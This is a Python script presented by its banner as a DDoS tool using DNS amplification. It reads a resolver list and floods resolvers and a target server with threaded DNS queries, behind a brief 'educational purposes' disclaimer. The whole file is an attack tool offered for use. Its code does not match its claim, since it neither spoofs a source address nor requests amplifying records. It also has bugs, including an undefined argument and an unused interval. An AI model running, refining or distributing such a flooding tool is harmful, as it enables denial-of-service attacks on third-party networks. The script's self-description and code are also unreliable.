import socket
import threading
import time
import argparse

def get_resolvers_from_file(file_path):
    with open(file_path, 'r') as file:
        resolvers = [line.strip() for line in file.readlines()]
    return resolvers

def send_queries_through_resolvers(domain, resolvers, server_port, num_queries, interval, verbose):
    for resolver in resolvers:
        send_multiple_queries(domain, resolver, server_port, num_queries, interval, verbose)

def get_address_port():
    address = input("Enter server address: ")
    port = int(input("Enter server port: "))
    return address, port

def send_dns_query(domain_name, dns_server_address, dns_server_port, interval, verbose):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (dns_server_address, dns_server_port)

    try:
        # crafting DNS query message
        identifier = 0x1337.to_bytes(2, byteorder='big')
        flags = (0).to_bytes(2, byteorder='big')
        qdcount = (1).to_bytes(2, byteorder='big')
        qtype = (1).to_bytes(2, byteorder='big')
        qclass = (1).to_bytes(2, byteorder='big')

        labels = domain_name.split('.')
        qname = b''.join(len(label).to_bytes(1, byteorder='big') + label.encode() for label in labels) + b'\x00'

        dns_query = identifier + flags + qdcount + (b'\x00\x00\x00\x00\x00\x00') + qname + qtype + qclass

        # If verbose mode is enabled, print information about the packet being sent
        if verbose:
            print(f"Sending DNS query for {domain_name} to {dns_server_address}:{dns_server_port}")

        # Send DNS query to the server
        client_socket.sendto(dns_query, server_address)

        # Receive the response from the server (1024 bytes buffer size)
        data, _ = client_socket.recvfrom(1024)

        # If verbose mode is enabled, print information about the received packet
        if verbose:
            print(f"Received DNS Response for {domain_name}:\n", data.hex())  # Print the response in hexadecimal format

    finally:
        # Close the socket
        client_socket.close()

def send_multiple_queries(domain, server_address, server_port, num_queries, interval, verbose):
    threads = []
    for _ in range(num_queries):
        thread = threading.Thread(target=send_dns_query, args=(domain, server_address, server_port, interval, verbose))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

def display_banner():
    print('''
█▀▄▀█ ▄███▄     ▄▄▄▄▀ ▄███▄   ████▄ █▄▄▄▄ ██   ▄█    ▄   
█ █ █ █▀   ▀ ▀▀▀ █    █▀   ▀  █   █ █  ▄▀ █ █  ██     █  
█ ▄ █ ██▄▄       █    ██▄▄    █   █ █▀▀▌  █▄▄█ ██ ██   █ 
█   █ █▄   ▄▀   █     █▄   ▄▀ ▀████ █  █  █  █ ▐█ █ █  █ 
   █  ▀███▀    ▀      ▀███▀           █      █  ▐ █  █ █ 
  ▀                                  ▀      █     █   ██ 
                                           ▀  Author: r3vskd           
''')
    print("Script to perform DDoS using DNS amplification (reflection) technique.")
    print("It was created for educational purposes. Please don't misuse it for illegal activities.")
    print("Usage:")
    print(" python ./poc2.py -f resolvers.txt <domain> <server_address> <server_port> <num_queries> <interval> [-v/--verbose]\n")
    print("Options:")
    print("  domain            Domain name to query")
    print("  -f                DNS Resolvers txt file")
    print("  server_address    DNS server address")
    print("  -p or --port      DNS server port")
    print("  num_queries       Number of queries to send")
    print("  interval          Interval between queries in seconds")
    print("  -v or --verbose   Enable verbose mode (optional)\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DNS query sender')
    parser.add_argument('domain', nargs='?', type=str, help='Domain name to query')
    parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
    parser.add_argument('server_address', nargs='?', type=str, help='DNS server address')
    parser.add_argument('-p', '--port', type=int, help='DNS server port')
    parser.add_argument('num_queries', nargs='?', type=int, help='Number of queries to send')
    parser.add_argument('interval', nargs='?', type=float, help='Interval between queries in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')

    args = parser.parse_args()

    if not any(vars(args).values()):
        display_banner()
    elif args.file and args.port:
        resolvers=get_resolvers_from_file(args.file)
        send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.verbose)
        send_multiple_queries(args.domain, args.server_address, args.server_port, args.num_queries, args.interval, args.verbose)
    else:
         print("Please provide a file containing DNS resolver addresses using -f/--file and specify the DNS server port using -p/--port.")
